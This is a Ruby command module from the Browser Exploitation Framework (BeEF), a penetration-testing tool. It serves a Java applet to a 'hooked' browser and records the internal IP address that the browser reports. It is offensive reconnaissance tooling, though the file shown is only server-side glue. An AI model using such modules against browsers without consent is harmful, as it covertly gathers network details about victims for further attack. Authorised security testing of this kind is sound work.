#
# Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Get_internal_ip < BeEF::Core::Command

  def pre_send
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/host/get_internal_ip/get_internal_ip.class', '/get_internal_ip', 'class')
  end

  #def self.options
  #  return [
  #      { 'name' => 'applet_name', 'description' => 'Applet Name', 'ui_label'=>'Number', 'value' =>'5551234','width' => '200px' },
  #  ]
  #end

  def post_execute
    content = {}
    content['Result'] = @datastore['result']
    save content
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/get_internal_ip.class')

    configuration = BeEF::Core::Configuration.instance
    if configuration.get("beef.extension.network.enable") == true

      session_id = @datastore['beefhook']
      cid = @datastore['cid'].to_i

      # save the network host
      if @datastore['results'] =~ /^([\d\.]+)$/
        ip = $1
        print_debug("Hooked browser has network interface #{ip}")
        r = BeEF::Core::Models::NetworkHost.new(:hooked_browser_id => session_id, :ip => ip, :cid => cid)
        r.save
      end
    end

  end

end
